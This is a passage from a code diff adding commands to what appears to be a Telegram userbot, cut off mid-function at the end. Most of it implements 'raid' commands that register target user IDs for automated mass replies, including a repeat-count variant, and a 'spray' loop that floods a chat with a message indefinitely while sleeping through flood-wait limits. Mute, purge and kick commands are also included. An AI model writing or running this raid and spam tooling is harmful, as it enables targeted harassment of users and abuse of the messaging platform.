+        await safe_edit(event, f"❌ 𝐃ɪᴄᴇ 𝐄ʀʀ → `{str(e)[:40]}`")
+
+# Raid Commands
+@register_cmd("reply", needs_reply=True)
+async def cmd_reply(event, arg):
+    try:
+        targets = await get_targets(event, arg)
+
+        if not targets:
+            return await safe_edit(event,
+                "❌ 𝐍ᴏ 𝐕ᴀʟɪᴅ 𝐓ᴀʀɢᴇᴛ"
+            )
+
+        await safe_edit(event,
+            "⚡ 𝐄ɴᴀʙʟɪɴɢ 𝐑ᴇᴘʟʏ 𝐑ᴀɪᴅ (𝐆ʟᴏʙᴀʟ)...\n━━━━━━━━━━━━━━━"
+        )
+
+        added, already = [], []
+
+        for uid in targets:
+            try:
+                uid = int(uid)
+            except:
+                continue
+
+            if uid in reply_users:
+                already.append(str(uid))
+            else:
+                reply_users.add(uid)
+                added.append(str(uid))
+
+        parts = []
+
+        if added:
+            parts.append(f"🔥 𝐑ᴇᴘʟʏ 𝐑ᴀɪᴅ 𝐎ɴ → `{', '.join(added)}`")
+
+        if already:
+            parts.append(f"⚠️ 𝐀ʟʀᴇᴀᴅʏ 𝐀ᴄᴛɪᴠᴇ → `{', '.join(already)}`")
+
+        if not parts:
+            parts.append("❌ 𝐍ᴏ 𝐂ʜᴀɴɢᴇ")
+
+        msg = "\n".join(parts)
+
+        if event.out:
+            await safe_edit(event, msg)
+        else:
+            await event.reply(msg)
+
+    except FloodWaitError as fw:
+        await safe_edit(event, f"⏳ 𝐅ʟᴏᴏᴅ → {fw.seconds}s")
+    except Exception as e:
+        await safe_edit(event, f"❌ 𝐑ᴇᴘʟʏ 𝐑ᴀɪᴅ 𝐄ʀʀ → `{str(e)[:40]}`")
+
+
+@register_cmd("rr", needs_reply=True)
+async def cmd_rr(event, arg):
+    try:
+        targets = await get_targets(event, arg)
+
+        if not targets:
+            return await safe_edit(event,
+                "❌ 𝐍ᴏ 𝐕ᴀʟɪᴅ 𝐓ᴀʀɢᴇᴛ"
+            )
+
+        await safe_edit(event,
+            "⚡ 𝐄ɴᴀʙʟɪɴɢ 𝐑𝐑 𝐑ᴀɪᴅ (𝐆ʟᴏʙᴀʟ)...\n━━━━━━━━━━━━━━━"
+        )
+
+        added, already = [], []
+
+        for uid in targets:
+            try:
+                uid = int(uid)
+            except:
+                continue
+
+            if uid in rr_users:
+                already.append(str(uid))
+            else:
+                rr_users.add(uid)
+                added.append(str(uid))
+
+        parts = []
+
+        if added:
+            parts.append(f"⚡ 𝐑𝐑 𝐎ɴ → `{', '.join(added)}`")
+
+        if already:
+            parts.append(f"⚠️ 𝐀ʟʀᴇᴀᴅʏ → `{', '.join(already)}`")
+
+        if not parts:
+            parts.append("❌ 𝐍ᴏ 𝐂ʜᴀɴɢᴇ")
+
+        msg = "\n".join(parts)
+
+        if event.out:
+            await safe_edit(event, msg)
+        else:
+            await event.reply(msg)
+
+    except FloodWaitError as fw:
+        await safe_edit(event, f"⏳ 𝐅ʟᴏᴏᴅ → {fw.seconds}s")
+    except Exception as e:
+        await safe_edit(event, f"❌ 𝐑𝐑 𝐄ʀʀ → `{str(e)[:40]}`")
+
+
+@register_cmd("flag", needs_reply=True)
+async def cmd_flag(event, arg):
+    try:
+        targets = await get_targets(event, arg)
+
+        if not targets:
+            return await safe_edit(event,
+                "❌ 𝐍ᴏ 𝐕ᴀʟɪᴅ 𝐓ᴀʀɢᴇᴛ"
+            )
+
+        await safe_edit(event,
+            "⚡ 𝐄ɴᴀʙʟɪɴɢ 𝐅ʟᴀɢ 𝐑ᴀɪᴅ (𝐆ʟᴏʙᴀʟ)...\n━━━━━━━━━━━━━━━"
+        )
+
+        added, already = [], []
+
+        for uid in targets:
+            try:
+                uid = int(uid)
+            except:
+                continue
+
+            if uid in flag_users:
+                already.append(str(uid))
+            else:
+                flag_users.add(uid)
+                added.append(str(uid))
+
+        parts = []
+
+        if added:
+            parts.append(f"🌊 𝐅ʟᴀɢ 𝐎ɴ → `{', '.join(added)}`")
+
+        if already:
+            parts.append(f"⚠️ 𝐀ʟʀᴇᴀᴅʏ → `{', '.join(already)}`")
+
+        if not parts:
+            parts.append("❌ 𝐍ᴏ 𝐂ʜᴀɴɢᴇ")
+
+        msg = "\n".join(parts)
+
+        if event.out:
+            await safe_edit(event, msg)
+        else:
+            await event.reply(msg)
+
+    except FloodWaitError as fw:
+        await safe_edit(event, f"⏳ 𝐅ʟᴏᴏᴅ → {fw.seconds}s")
+    except Exception as e:
+        await safe_edit(event, f"❌ 𝐅ʟᴀɢ 𝐄ʀʀ → `{str(e)[:40]}`")
+
+
+@register_cmd("hrr", needs_reply=True)
+async def cmd_hrr(event, arg):
+    try:
+        targets = await get_targets(event, arg)
+
+        if not targets:
+            return await safe_edit(event,
+                "❌ 𝐍ᴏ 𝐕ᴀʟɪᴅ 𝐓ᴀʀɢᴇᴛ"
+            )
+
+        await safe_edit(event,
+            "⚡ 𝐄ɴᴀʙʟɪɴɢ 𝐇ᴇᴀʀᴛ 𝐑ᴀɪᴅ (𝐆ʟᴏʙᴀʟ)...\n━━━━━━━━━━━━━━━"
+        )
+
+        added, already = [], []
+
+        for uid in targets:
+            try:
+                uid = int(uid)
+            except:
+                continue
+
+            if uid in hrr_users:
+                already.append(str(uid))
+            else:
+                hrr_users.add(uid)
+                added.append(str(uid))
+
+        parts = []
+
+        if added:
+            parts.append(f"💜 𝐇ᴇᴀʀᴛ 𝐑ᴀɪᴅ → `{', '.join(added)}`")
+
+        if already:
+            parts.append(f"⚠️ 𝐀ʟʀᴇᴀᴅʏ → `{', '.join(already)}`")
+
+        if not parts:
+            parts.append("❌ 𝐍ᴏ 𝐂ʜᴀɴɢᴇ")
+
+        msg = "\n".join(parts)
+
+        if event.out:
+            await safe_edit(event, msg)
+        else:
+            await event.reply(msg)
+
+    except FloodWaitError as fw:
+        await safe_edit(event, f"⏳ 𝐅ʟᴏᴏᴅ → {fw.seconds}s")
+    except Exception as e:
+        await safe_edit(event, f"❌ 𝐇𝐑𝐑 𝐄ʀʀ → `{str(e)[:40]}`")
+
+
+@register_cmd("replygod", needs_reply=True)
+async def cmd_replygod(event, arg):
+    try:
+        targets = await get_targets(event, arg)
+
+        if not targets:
+            return await safe_edit(event,
+                "❌ 𝐍ᴏ 𝐕ᴀʟɪᴅ 𝐓ᴀʀɢᴇᴛ"
+            )
+
+        await safe_edit(event,
+            "⚡ 𝐄ɴᴀʙʟɪɴɢ 𝐑ᴇᴘʟʏ𝐆ᴏᴅ (𝐆ʟᴏʙᴀʟ)...\n━━━━━━━━━━━━━━━"
+        )
+
+        added, already = [], []
+
+        for uid in targets:
+            try:
+                uid = int(uid)
+            except:
+                continue
+
+            if uid in replygod_users:
+                already.append(str(uid))
+            else:
+                replygod_users.add(uid)
+                added.append(str(uid))
+
+        parts = []
+
+        if added:
+            parts.append(f"💥 𝐑ᴇᴘʟʏ𝐆ᴏᴅ → `{', '.join(added)}`")
+
+        if already:
+            parts.append(f"⚠️ 𝐀ʟʀᴇᴀᴅʏ → `{', '.join(already)}`")
+
+        if not parts:
+            parts.append("❌ 𝐍ᴏ 𝐂ʜᴀɴɢᴇ")
+
+        msg = "\n".join(parts)
+
+        if event.out:
+            await safe_edit(event, msg)
+        else:
+            await event.reply(msg)
+
+    except FloodWaitError as fw:
+        await safe_edit(event, f"⏳ 𝐅ʟᴏᴏᴅ → {fw.seconds}s")
+    except Exception as e:
+        await safe_edit(event, f"❌ 𝐑𝐆 𝐄ʀʀ → `{str(e)[:40]}`")
+
+
+@register_cmd("replyyorichi", needs_reply=True)
+async def cmd_replyyorichi(event, arg):
+    try:
+        if not arg or len(arg.split()) < 2:
+            return await safe_edit(event,
+                "❌ 𝐈ɴᴠᴀʟɪᴅ 𝐅ᴏʀᴍᴀᴛ\n👉 `.replyyorichi <text> <count>`"
+            )
+
+        text, count = arg.rsplit(" ", 1)
+
+        try:
+            count = int(count)
+        except:
+            return await safe_edit(event,
+                "❌ 𝐂ᴏᴜɴᴛ 𝐌ᴜsᴛ 𝐁ᴇ 𝐍ᴜᴍʙᴇʀ"
+            )
+
+        if count <= 0:
+            count = 1
+        if count > 100:
+            count = 100
+
+        targets = await get_targets(event, "")
+
+        if not targets:
+            return await safe_edit(event,
+                "❌ 𝐍ᴏ 𝐕ᴀʟɪᴅ 𝐓ᴀʀɢᴇᴛ"
+            )
+
+        await safe_edit(event,
+            "⚡ 𝐒ᴇᴛᴛɪɴɢ 𝐑ᴇᴘʟʏ𝐂ʜᴀᴍᴘᴜ (𝐆ʟᴏʙᴀʟ)...\n━━━━━━━━━━━━━━━"
+        )
+
+        added, overridden = [], []
+
+        for uid in targets:
+            try:
+                uid = int(uid)
+            except:
+                continue
+
+            if uid in replyyorichi_users:
+                overridden.append(str(uid))
+
+            replyyorichi_users[uid] = {
+                "text": text,
+                "count": count
+            }
+            added.append(str(uid))
+
+        parts = []
+
+        if added:
+            parts.append(f"☄️ 𝐑𝐘 → `{', '.join(added)}` × `{count}`")
+
+        if overridden:
+            parts.append(f"⚠️ 𝐎ᴠᴇʀʀɪᴅᴇ → `{', '.join(overridden)}`")
+
+        msg = "\n".join(parts)
+
+        if event.out:
+            await safe_edit(event, msg)
+        else:
+            await event.reply(msg)
+
+    except FloodWaitError as fw:
+        await safe_edit(event, f"⏳ 𝐅ʟᴏᴏᴅ → {fw.seconds}s")
+    except Exception as e:
+        await safe_edit(event, f"❌ 𝐑𝐘 𝐄ʀʀ → `{str(e)[:40]}`")
+
+@register_cmd("spray")
+async def cmd_spray(event, arg):
+    try:
+        if not arg:
+            return await safe_edit(
+                event,
+                "❌ 𝐍ᴏ 𝐓ᴇxᴛ 𝐆ɪᴠᴇɴ\n"
+                "👉 𝐔sᴀɢᴇ: `.spray <text>`"
+            )
+
+        chat = event.chat_id
+
+        # ─── HUGE TEXT GUARD ───
+        if len(arg) > 4000:
+            arg = arg[:4000]
+
+        # ─── ALREADY ACTIVE GUARD ───
+        if chat in spray_tasks and not spray_tasks[chat].done():
+            msg = "⚠️ 𝐒ᴘʀᴀʏ 𝐀ʟʀᴇᴀᴅʏ 𝐀ᴄᴛɪᴠᴇ"
+            if event.out:
+                return await safe_edit(event, msg)
+            else:
+                return await event.reply(msg)
+
+        await safe_edit(
+            event,
+            "⚡ 𝐈ɴɪᴛɪᴀʟɪᴢɪɴɢ 𝐒ᴘʀᴀʏ...\n━━━━━━━━━━━━━━━"
+        )
+
+        async def spray_loop():
+            try:
+                while True:
+                    # stop condition
+                    if chat not in spray_tasks:
+                        break
+
+                    try:
+                        await bot.send_message(chat, arg)
+                    except FloodWaitError as fw:
+                        await asyncio.sleep(fw.seconds)
+                    except RPCError:
+                        # permission lost / banned / readonly
+                        spray_tasks.pop(chat, None)
+                        break
+                    except Exception:
+                        # network / msg send fail
+                        await asyncio.sleep(2)
+
+                    await asyncio.sleep(SPRAY_DELAY)
+
+            except asyncio.CancelledError:
+                pass
+            finally:
+                spray_tasks.pop(chat, None)
+
+        spray_tasks[chat] = asyncio.create_task(spray_loop())
+
+        text = (
+            "💣 𝐒ᴘʀᴀʏ 𝐒ᴛᴀʀᴛᴇᴅ\n"
+            "━━━━━━━━━━━━━━━\n"
+            f"📢 𝐓ᴇxᴛ → `{arg[:40]}`"
+        )
+
+        if event.out:
+            await safe_edit(event, text)
+        else:
+            await event.reply(text)
+
+    except Exception as e:
+        await safe_edit(event,
+            f"❌ 𝐒ᴘʀᴀʏ 𝐄ʀʀ → `{str(e)[:40]}`"
+        )
+
+
+@register_cmd("dspray")
+async def cmd_dspray(event, _):
+    try:
+        chat = event.chat_id
+
+        if chat not in spray_tasks:
+            msg = "⚠️ 𝐍ᴏ 𝐀ᴄᴛɪᴠᴇ 𝐒ᴘʀᴀʏ"
+            if event.out:
+                return await safe_edit(event, msg)
+            else:
+                return await event.reply(msg)
+
+        await safe_edit(
+            event,
+            "⚡ 𝐒ᴛᴏᴘᴘɪɴɢ 𝐒ᴘʀᴀʏ...\n━━━━━━━━━━━━━━━"
+        )
+
+        try:
+            spray_tasks[chat].cancel()
+        except:
+            pass
+
+        spray_tasks.pop(chat, None)
+
+        text = (
+            "🛑 𝐒ᴘʀᴀʏ 𝐒ᴛᴏᴘᴘᴇᴅ\n"
+            "━━━━━━━━━━━━━━━"
+        )
+
+        if event.out:
+            await safe_edit(event, text)
+        else:
+            await event.reply(text)
+
+    except Exception as e:
+        await safe_edit(event,
+            f"❌ 𝐃𝐒ᴘʀᴀʏ 𝐄ʀʀ → `{str(e)[:40]}`"
+        )
+
+# Mute Commands
+@register_cmd("mute", needs_reply=True)
+async def cmd_mute(event, arg):
+    try:
+        targets = await get_targets(event, arg)
+
+        if not targets:
+            return await safe_edit(
+                event,
+                "❌ 𝐍ᴏ 𝐓ᴀʀɢᴇᴛ\n👉 `.mute` (reply / @username / id)"
+            )
+
+        await safe_edit(
+            event,
+            "⚡ 𝐏ʀᴏᴄᴇssɪɴɢ 𝐌ᴜᴛᴇ...\n━━━━━━━━━━━━━━━"
+        )
+
+        added, already = [], []
+
+        for uid in targets:
+            try:
+                uid = int(uid)
+            except:
+                continue
+
+            if uid in muted_users:
+                already.append(str(uid))
+            else:
+                muted_users.add(uid)
+                added.append(str(uid))
+
+        parts = []
+
+        if added:
+            parts.append(f"🔇 𝐌ᴜᴛᴇ → `{', '.join(added)}`")
+
+        if already:
+            parts.append(f"⚠️ 𝐀ʟʀᴇᴀᴅʏ 𝐌ᴜᴛᴇᴅ → `{', '.join(already)}`")
+
+        if not parts:
+            parts.append("❌ 𝐍ᴏ 𝐂ʜᴀɴɢᴇ")
+
+        msg = "\n".join(parts)
+
+        if event.out:
+            await safe_edit(event, msg)
+        else:
+            await event.reply(msg)
+
+    except FloodWaitError as fw:
+        await safe_edit(event, f"⏳ 𝐅ʟᴏᴏᴅ → {fw.seconds}s")
+    except Exception as e:
+        await safe_edit(event, f"❌ 𝐌ᴜᴛᴇ 𝐄ʀʀ → `{str(e)[:40]}`")
+
+
+@register_cmd("unmute", needs_reply=True)
+async def cmd_unmute(event, arg):
+    try:
+        targets = await get_targets(event, arg)
+
+        if not targets:
+            return await safe_edit(
+                event,
+                "❌ 𝐍ᴏ 𝐓ᴀʀɢᴇᴛ\n👉 `.unmute` (reply / @username / id)"
+            )
+
+        await safe_edit(
+            event,
+            "⚡ 𝐏ʀᴏᴄᴇssɪɴɢ 𝐔ɴᴍᴜᴛᴇ...\n━━━━━━━━━━━━━━━"
+        )
+
+        removed, not_muted = [], []
+
+        for uid in targets:
+            try:
+                uid = int(uid)
+            except:
+                continue
+
+            if uid in muted_users:
+                muted_users.remove(uid)
+                removed.append(str(uid))
+            else:
+                not_muted.append(str(uid))
+
+        parts = []
+
+        if removed:
+            parts.append(f"🗣️ 𝐔ɴᴍᴜᴛᴇ → `{', '.join(removed)}`")
+
+        if not_muted:
+            parts.append(f"⚠️ 𝐍ᴏᴛ 𝐌ᴜᴛᴇᴅ → `{', '.join(not_muted)}`")
+
+        if not parts:
+            parts.append("❌ 𝐍ᴏ 𝐂ʜᴀɴɢᴇ")
+
+        msg = "\n".join(parts)
+
+        if event.out:
+            await safe_edit(event, msg)
+        else:
+            await event.reply(msg)
+
+    except FloodWaitError as fw:
+        await safe_edit(event, f"⏳ 𝐅ʟᴏᴏᴅ → {fw.seconds}s")
+    except Exception as e:
+        await safe_edit(event, f"❌ 𝐔ɴᴍᴜᴛᴇ 𝐄ʀʀ → `{str(e)[:40]}`")
+
+
+@register_cmd("gmute", needs_reply=True)
+async def cmd_gmute(event, arg):
+    try:
+        targets = await get_targets(event, arg)
+
+        if not targets:
+            return await safe_edit(
+                event,
+                "❌ 𝐍ᴏ 𝐓ᴀʀɢᴇᴛ\n👉 `.gmute` (reply / @username / id)"
+            )
+
+        await safe_edit(
+            event,
+            "⚡ 𝐏ʀᴏᴄᴇssɪɴɢ 𝐆ᴍᴜᴛᴇ...\n━━━━━━━━━━━━━━━"
+        )
+
+        added, already = [], []
+
+        for uid in targets:
+            try:
+                uid = int(uid)
+            except:
+                continue
+
+            if uid in global_muted:
+                already.append(str(uid))
+            else:
+                global_muted.add(uid)
+                added.append(str(uid))
+
+        parts = []
+
+        if added:
+            parts.append(f"🔕 𝐆ᴍᴜᴛᴇ → `{', '.join(added)}`")
+
+        if already:
+            parts.append(f"⚠️ 𝐀ʟʀᴇᴀᴅʏ 𝐆ᴍᴜᴛᴇᴅ → `{', '.join(already)}`")
+
+        if not parts:
+            parts.append("❌ 𝐍ᴏ 𝐂ʜᴀɴɢᴇ")
+
+        msg = "\n".join(parts)
+
+        if event.out:
+            await safe_edit(event, msg)
+        else:
+            await event.reply(msg)
+
+    except FloodWaitError as fw:
+        await safe_edit(event, f"⏳ 𝐅ʟᴏᴏᴅ → {fw.seconds}s")
+    except Exception as e:
+        await safe_edit(event, f"❌ 𝐆ᴍᴜᴛᴇ 𝐄ʀʀ → `{str(e)[:40]}`")
+
+
+@register_cmd("gunmute", needs_reply=True)
+async def cmd_gunmute(event, arg):
+    try:
+        targets = await get_targets(event, arg)
+
+        if not targets:
+            return await safe_edit(
+                event,
+                "❌ 𝐍ᴏ 𝐓ᴀʀɢᴇᴛ\n👉 `.gunmute` (reply / @username / id)"
+            )
+
+        await safe_edit(
+            event,
+            "⚡ 𝐏ʀᴏᴄᴇssɪɴɢ 𝐆ᴜɴᴍᴜᴛᴇ...\n━━━━━━━━━━━━━━━"
+        )
+
+        removed, not_muted = [], []
+
+        for uid in targets:
+            try:
+                uid = int(uid)
+            except:
+                continue
+
+            if uid in global_muted:
+                global_muted.remove(uid)
+                removed.append(str(uid))
+            else:
+                not_muted.append(str(uid))
+
+        parts = []
+
+        if removed:
+            parts.append(f"🔊 𝐆ᴜɴᴍᴜᴛᴇ → `{', '.join(removed)}`")
+
+        if not_muted:
+            parts.append(f"⚠️ 𝐍ᴏᴛ 𝐆ᴍᴜᴛᴇᴅ → `{', '.join(not_muted)}`")
+
+        if not parts:
+            parts.append("❌ 𝐍ᴏ 𝐂ʜᴀɴɢᴇ")
+
+        msg = "\n".join(parts)
+
+        if event.out:
+            await safe_edit(event, msg)
+        else:
+            await event.reply(msg)
+
+    except FloodWaitError as fw:
+        await safe_edit(event, f"⏳ 𝐅ʟᴏᴏᴅ → {fw.seconds}s")
+    except Exception as e:
+        await safe_edit(event, f"❌ 𝐆𝐔𝐍𝐌𝐔𝐓𝐄 𝐄ʀʀ → `{str(e)[:40]}`")
+
+# Group Mod
+@register_cmd("purge")
+async def cmd_purge(event, arg):
+    try:
+        try:
+            count = int(arg) if arg else 50
+        except:
+            count = 50
+
+        # ─── HARD LIMIT ENGINE ───
+        if count < 1:
+            count = 1
+        if count > 200:
+            count = 200
+
+        await safe_edit(
+            event,
+            "⚡ 𝐏ᴜʀɢɪɴɢ 𝐌ᴇssᴀɢᴇs...\n━━━━━━━━━━━━━━━"
+        )
+
+        msgs = []
+        async for m in bot.iter_messages(event.chat_id, limit=count + 1):
+            msgs.append(m.id)
+
+        if not msgs:
+            return await safe_edit(event,
+                "⚠️ 𝐍ᴏ 𝐌ᴇssᴀɢᴇs 𝐅ᴏᴜɴᴅ"
+            )
+
+        # ─── SAFE DELETE BATCH ───
+        try:
+            await bot.delete_messages(event.chat_id, msgs)
+        except FloodWaitError as fw:
+            await asyncio.sleep(fw.seconds)
+            await bot.delete_messages(event.chat_id, msgs)
+        except RPCError:
+            # readonly / no rights / protected msgs
+            pass
+
+        text = (
+            "🧹 𝐏ᴜʀɢᴇ 𝐂ᴏᴍᴘʟᴇᴛᴇ\n"
+            "━━━━━━━━━━━━━━━\n"
+            f"🗑️ 𝐃ᴇʟᴇᴛᴇᴅ → `{max(len(msgs)-1,0)}`"
+        )
+
+        if event.out:
+            await safe_edit(event, text)
+        else:
+            await event.reply(text)
+
+    except Exception as e:
+        await safe_edit(event,
+            f"❌ 𝐏ᴜʀɢᴇ 𝐄ʀʀ → `{str(e)[:40]}`"
+        )
+
+
+@register_cmd("throw", needs_reply=True, group_only=True)
+async def cmd_throw(event, arg):
+    try:
+        targets = await get_targets(event, arg)
+
+        if not targets:
+            return await safe_edit(event,
+                "❌ 𝐍ᴏ 𝐓ᴀʀɢᴇᴛ"
+            )
+
+        # ─── ADMIN CHECK SAFE ───
+        try:
+            perms = await bot.get_permissions(event.chat_id, 'me')
+            if not perms.is_admin:
+                return await safe_edit(event,
+                    "❌ 𝐍ᴏ 𝐀ᴅᴍɪɴ 𝐑ɪɢʜᴛs"
+                )
+        except:
+            return await safe_edit(event,
+                "❌ 𝐏ᴇʀᴍ𝐢ssɪᴏɴ 𝐂ʜᴇᴄᴋ 𝐅ᴀɪʟ"
+            )
+
+        await safe_edit(
+            event,
+            "⚡ 𝐊ɪᴄᴋɪɴɢ 𝐓ᴀʀɢᴇᴛs...\n━━━━━━━━━━━━━━━"
+        )
+
+        kicked, failed, skipped = [], [], []
+
+        me = await bot.get_me()
+
+        for uid in targets:
+            try:
+                uid = int(uid)
+            except:
+                continue
+
+            if uid == me.id:
+                skipped.append(str(uid))
+                continue
+
+            try:
+                await bot.kick_participant(event.chat_id, uid)
+                kicked.append(str(uid))
+            except:
+                failed.append(str(uid))
+
+        parts = []
+
+        if kicked:
+            parts.append(f"👞 𝐊ɪᴄᴋᴇᴅ → `{', '.join(kicked)}`")
+
+        if failed:
+            parts.append(f"⚠️ 𝐅ᴀɪʟᴇᴅ → `{', '.join(failed)}`")
+
+        if skipped:
+            parts.append(f"👑 𝐒ᴇʟғ 𝐒ᴋɪᴘ → `{', '.join(skipped)}`")
+
+        if not parts:
+            parts.append("❌ 𝐍ᴏ 𝐀ᴄᴛɪᴏɴ")
+
+        msg = "\n".join(parts)
+
+        if event.out:
+            await safe_edit(event, msg)
+        else:
+            await event.reply(msg)
+
+    except FloodWaitError as fw:
+        await safe_edit(event, f"⏳ 𝐅ʟᴏᴏᴅ → {fw.seconds}s")
+    except Exception as e:
+        await safe_edit(event,
+            f"❌ 𝐓ʜʀᴏᴡ 𝐄ʀʀ → `{str(e)[:40]}`"
+        )
+
+
+@register_cmd("sreply")
+async def cmd_sreply(event, arg):
+    try:
+        targets = await get_targets(event, arg)
+
+        if targets:
+            stopped, not_active = [], []
+
+            for uid in targets:
+                try:
+                    uid = int(uid)
+                except:
+                    continue
+
+                if uid in reply_users:
+                    reply_users.discard(uid)
+                    stopped.append(str(uid))
+                else:
+                    not_active.append(str(uid))
+
+            parts = []
+
+            if stopped:
+                parts.append(f"🛑 𝐑ᴇᴘʟʏ 𝐎ғғ → `{', '.join(stopped)}`")
+
+            if not_active:
+                parts.append(f"⚠️ 𝐍ᴏᴛ 𝐀ᴄᴛɪᴠᴇ → `{', '.join(not_active)}`")
+
+            if not parts:
+                parts.append("❌ 𝐍ᴏ 𝐂ʜᴀɴɢᴇ")
+
+            text = "\n".join(parts)
+
+        else:
+            reply_users.clear()
+            text = (
+                "🛑 𝐑ᴇᴘʟʏ 𝐎ғғ\n"
+                "━━━━━━━━━━━━━━━\n"
+                "👉 𝐀ʟʟ 𝐔sᴇʀs"
+            )
+
+        if event.out:
+            await safe_edit(event, text)
+        else:
+            await event.reply(text)
+
+    except Exception as e:
+        await safe_edit(event,
+            f"❌ 𝐒𝐑𝐄𝐏𝐋𝐘 𝐄ʀʀ → `{str(e)[:40]}`"
+        )
+
+
+@register_cmd("srr")
+async def cmd_srr(event, arg):
+    try:
+        targets = await get_targets(event, arg)
+
+        if targets:
+            stopped, not_active = [], []
+
+            for uid in targets:
+                try:
+                    uid = int(uid)
+                except:
+                    continue
+
+                if uid in rr_users:
+                    rr_users.discard(uid)
+                    stopped.append(str(uid))
+                else:
+                    not_active.append(str(uid))
+
+            parts = []
+
+            if stopped:
+                parts.append(f"🛑 𝐑𝐑 𝐎ғғ → `{', '.join(stopped)}`")
+
+            if not_active:
+                parts.append(f"⚠️ 𝐍ᴏᴛ 𝐀ᴄᴛɪᴠᴇ → `{', '.join(not_active)}`")
+
+            if not parts:
+                parts.append("❌ 𝐍ᴏ 𝐂ʜᴀɴɢᴇ")
+
+            text = "\n".join(parts)
+
+        else:
+            rr_users.clear()
+
+            text = (
+                "🛑 𝐑𝐑 𝐎ғғ\n"
+                "━━━━━━━━━━━━━━━\n"
+                "👉 𝐀ʟʟ 𝐔sᴇʀs"
+            )
+
+        if event.out:
+            await safe_edit(event, text)
+        else:
+            await event.reply(text)
+
+    except Exception as e:
+        await safe_edit(event,
+            f"❌ 𝐒𝐑𝐑 𝐄ʀʀ → `{str(e)[:40]}`"
+        )
+
+
+@register_cmd("sflag")
+async def cmd_sflag(event, arg):
+    try:
+        targets = await get_targets(event, arg)
+
+        if targets:
+            stopped, not_active = [], []
+
+            for uid in targets:
+                try:
+                    uid = int(uid)
+                except:
+                    continue
+
+                if uid in flag_users:
+                    flag_users.discard(uid)
+                    stopped.append(str(uid))
+                else:
+                    not_active.append(str(uid))
+
+            parts = []
+
+            if stopped:
+                parts.append(f"🛑 𝐅ʟᴀɢ 𝐎ғғ → `{', '.join(stopped)}`")
+
+            if not_active:
+                parts.append(f"⚠️ 𝐍ᴏᴛ 𝐀ᴄᴛɪᴠᴇ → `{', '.join(not_active)}`")
+
+            if not parts:
+                parts.append("❌ 𝐍ᴏ 𝐂ʜᴀɴɢᴇ")
+
+            text = "\n".join(parts)
+
+        else:
+            flag_users.clear()
+
+            text = (
+                "🛑 𝐅ʟᴀɢ 𝐎ғғ\n"
+                "━━━━━━━━━━━━━━━\n"
+                "👉 𝐀ʟʟ 𝐔sᴇʀs"
+            )
+
+        if event.out:
+            await safe_edit(event, text)
+        else:
+            await event.reply(text)
+
+    except Exception as e:
+        await safe_edit(event,
+            f"❌ 𝐒𝐅𝐋𝐀𝐆 𝐄ʀʀ → `{str(e)[:40]}`"
+        )
+
+
+@register_cmd("shrr")
+async def cmd_shrr(event, arg):
+    try:
+        targets = await get_targets(event, arg)
+
+        if targets:
+            await safe_edit(
+                event,
+                "⚡ 𝐃ɪsᴀʙʟɪɴɢ 𝐇ᴇᴀʀᴛ 𝐑ᴀɪᴅ (𝐆ʟᴏʙᴀʟ)...\n━━━━━━━━━━━━━━━"
+            )
+
+            stopped, not_active = [], []
+
+            for uid in targets:
+                try:
+                    uid = int(uid)
+                except:
+                    continue
+
+                if uid in hrr_users:
+                    hrr_users.discard(uid)
+                    stopped.append(str(uid))
+                else:
+                    not_active.append(str(uid))
+
+            parts = []
+
+            if stopped:
+                parts.append(
+                    f"🛑 𝐇ᴇᴀʀᴛ 𝐎ғғ → `{', '.join(stopped)}`"
+                )
+
+            if not_active:
+                parts.append(
+                    f"⚠️ 𝐍ᴏᴛ 𝐀ᴄᴛɪᴠᴇ → `{', '.join(not_active)}`"
+                )
+
+            if not parts:
+                parts.append("❌ 𝐍ᴏ 𝐂ʜᴀɴɢᴇ")
+
+            text = "\n".join(parts)
+
+        else:
+            hrr_users.clear()
+
+            text = (
+                "🛑 𝐇ᴇᴀʀᴛ 𝐎ғғ\n"
+                "━━━━━━━━━━━━━━━\n"
+                "👉 𝐀ʟʟ 𝐔sᴇʀs"
+            )
+
+        if event.out:
+            await safe_edit(event, text)
+        else:
+            await event.reply(text)
+
+    except Exception as e:
+        await safe_edit(event,
+            f"❌ 𝐒𝐇𝐑𝐑 𝐄ʀʀ → `{str(e)[:40]}`"
+        )
+
+
+@register_cmd("sgod")
+async def cmd_sgod(event, arg):
+    try:
+        targets = await get_targets(event, arg)
+
+        if targets:
+            await safe_edit(
+                event,
+                "⚡ 𝐃ɪsᴀʙʟɪɴɢ 𝐑ᴇᴘʟʏ𝐆ᴏᴅ (𝐆ʟᴏʙᴀʟ)...\n━━━━━━━━━━━━━━━"
+            )
+
+            stopped, not_active = [], []
+
+            for uid in targets:
+                try:
+                    uid = int(uid)
+                except:
+                    continue
+
+                if uid in replygod_users:
+                    replygod_users.discard(uid)
+                    stopped.append(str(uid))
+                else:
+                    not_active.append(str(uid))
+
+            parts = []
+
+            if stopped:
+                parts.append(
+                    f"🛑 𝐑𝐆 𝐎ғғ → `{', '.join(stopped)}`"
+                )
+
+            if not_active:
+                parts.append(
+                    f"⚠️ 𝐍ᴏᴛ 𝐀ᴄᴛɪᴠᴇ → `{', '.join(not_active)}`"
+                )
+
+            if not parts:
+                parts.append("❌ 𝐍ᴏ 𝐂ʜᴀɴɢᴇ")
+
+            text = "\n".join(parts)
+
+        else:
+            replygod_users.clear()
+
+            text = (
+                "🛑 𝐑𝐆 𝐎ғғ\n"
+                "━━━━━━━━━━━━━━━\n"
+                "👉 𝐀ʟʟ 𝐔sᴇʀs"
+            )
+
+        if event.out:
+            await safe_edit(event, text)
+        else:
+            await event.reply(text)
+
+    except Exception as e:
+        await safe_edit(event,
+            f"❌ 𝐒𝐆𝐎𝐃 𝐄ʀʀ → `{str(e)[:40]}`"
+        )
+
+
+@register_cmd("syorichi")
+async def cmd_syorichi(event, arg):
+    try:
+        targets = await get_targets(event, arg)
+
+        if targets:
+            await safe_edit(
+                event,
+                "⚡ 𝐃ɪsᴀʙʟɪɴɢ 𝐑𝐘 (𝐆ʟᴏʙᴀʟ)...\n━━━━━━━━━━━━━━━"
+            )
+
+            stopped, not_active = [], []
+
+            for uid in targets:
+                try:
+                    uid = int(uid)
+                except:
+                    continue
+
+                if uid in replyyorichi_users:
+                    replyyorichi_users.pop(uid, None)
+                    stopped.append(str(uid))
+                else:
+                    not_active.append(str(uid))
+
+            parts = []
+
+            if stopped:
+                parts.append(
+                    f"🛑 𝐑𝐘 𝐎ғғ → `{', '.join(stopped)}`"
+                )
+
+            if not_active:
+                parts.append(
+                    f"⚠️ 𝐍ᴏᴛ 𝐀ᴄᴛɪᴠᴇ → `{', '.join(not_active)}`"
+                )
+
+            if not parts:
